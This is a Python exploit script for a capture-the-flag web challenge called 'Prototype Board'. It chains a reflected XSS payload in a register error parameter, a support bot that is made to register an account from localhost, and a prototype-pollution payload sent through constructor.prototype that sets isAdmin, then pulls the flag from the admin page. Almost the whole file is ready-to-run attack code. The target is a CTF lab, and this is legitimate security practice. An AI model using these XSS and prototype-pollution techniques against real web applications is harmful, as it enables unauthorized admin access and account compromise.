#!/usr/bin/env python3
"""
Prototype Board CTF Challenge Exploit
Chains XSS + Bot SSRF + Prototype Pollution

Challenge: Prototype Board (CSC26 CTF)
Category: Web
Author: HexStrike

Description:
This exploit chains three vulnerabilities to gain admin access:
1. XSS in /register?error parameter
2. Support bot visiting from localhost:9937 (bypasses registration restriction)
3. Prototype pollution via constructor.prototype in /profile/update endpoint
"""

import requests
import urllib.parse
import time
import re

BASE_URL = "https://lkjhgfdsaqwertyui-csc26.cybersecuritychallenge.al"

def step1_register_via_xss():
    """
    Use XSS to make the support bot register a user from localhost:9937
    """
    print("[*] Step 1: Registering user via XSS + Bot SSRF")
    
    # XSS payload to make bot register a user
    xss_payload = """<script>
    fetch('/register', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'username=pwned&password=pwned123'
    });
    </script>"""
    
    # Submit malicious link to support
    encoded = urllib.parse.quote(xss_payload)
    support_data = {
        "reason": "Help",
        "link": f"register?error={encoded}"
    }
    
    r = requests.post(f"{BASE_URL}/support", data=support_data)
    
    if r.status_code == 200 and "Submitted" in r.text:
        print("[+] Payload submitted successfully")
        print("[*] Waiting for bot to execute XSS and register user...")
        time.sleep(6)  # Give bot time to visit and execute
        return True
    else:
        print(f"[-] Failed to submit payload: {r.status_code}")
        return False

def step2_login():
    """
    Login with the credentials registered by the bot
    """
    print("[*] Step 2: Logging in as registered user")
    
    session = requests.Session()
    login_data = {"username": "pwned", "password": "pwned123"}
    r = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=True)
    
    if "profile" in r.url:
        print("[+] Login successful!")
        return session
    else:
        print("[-] Login failed! User may not have been created.")
        print("[*] Try running the script again or increase the sleep time.")
        return None

def step3_pollute_prototype(session):
    """
    Exploit prototype pollution via constructor.prototype
    to set isAdmin property on all objects
    """
    print("[*] Step 3: Exploiting prototype pollution")
    
    # Use constructor.prototype instead of __proto__ (which is blocked)
    pollution_payload = {
        "constructor": {
            "prototype": {
                "isAdmin": True
            }
        }
    }
    
    r = session.post(f"{BASE_URL}/profile/update", json=pollution_payload)
    
    if r.status_code == 200:
        print("[+] Prototype polluted successfully!")
        print(f"[*] Server response: {r.json()}")
        return True
    else:
        print(f"[-] Pollution failed: {r.status_code}")
        print(f"[*] Response: {r.text}")
        return False

def step4_get_flag(session):
    """
    Access admin panel to retrieve the flag
    """
    print("[*] Step 4: Accessing admin panel")
    
    r = session.get(f"{BASE_URL}/admin")
    
    if r.status_code == 200:
        print("[+] Admin access granted!")
        
        # Extract flag
        flags = re.findall(r'CSC26\{[^}]+\}', r.text)
        if flags:
            print(f"\n{'='*60}")
            print(f"🚩 FLAG: {flags[0]}")
            print(f"{'='*60}\n")
            return flags[0]
        else:
            print("[-] Flag not found in response")
            print(r.text)
            return None
    else:
        print(f"[-] Admin access denied: {r.status_code}")
        return None

def exploit():
    """
    Main exploitation function
    """
    print("\n" + "="*60)
    print("Prototype Board CTF Exploit")
    print("="*60 + "\n")
    
    # Step 1: Register user via XSS
    if not step1_register_via_xss():
        return
    
    # Step 2: Login
    session = step2_login()
    if not session:
        return
    
    # Step 3: Pollute prototype
    if not step3_pollute_prototype(session):
        return
    
    # Step 4: Get flag
    flag = step4_get_flag(session)
    
    if flag:
        print("[+] Exploitation successful!")
    else:
        print("[-] Exploitation failed at final step")

if __name__ == "__main__":
    exploit()
